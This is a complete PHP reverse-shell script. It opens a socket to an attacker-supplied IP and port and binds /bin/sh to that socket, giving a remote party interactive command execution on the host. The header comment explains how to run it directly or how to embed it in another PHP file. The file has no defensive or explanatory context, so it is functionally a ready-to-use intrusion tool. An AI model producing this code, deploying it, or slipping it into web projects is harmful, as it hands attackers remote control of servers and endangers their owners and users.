<?php
/**
 * PHP Reverse Shell
 * Usage: php shell.php ATTACKER_IP ATTACKER_PORT
 * Or embedded: Set $ip and $port before including
 */

// Configuration
$ip = isset($argv[1]) ? $argv[1] : '127.0.0.1';  // Attacker IP
$port = isset($argv[2]) ? $argv[2] : 4444;        // Attacker port

// Attempt reverse shell connection
$sock = fsockopen($ip, $port);
if (!$sock) {
    echo "[-] Connection failed to {$ip}:{$port}\n";
    exit(1);
}

echo "[+] Reverse shell connected to {$ip}:{$port}\n";

// Duplicate socket to stdin/stdout/stderr
if (is_resource($sock)) {
    proc_open(
        "/bin/sh",
        [0 => $sock, 1 => $sock, 2 => $sock],
        $pipes
    );
}
?>
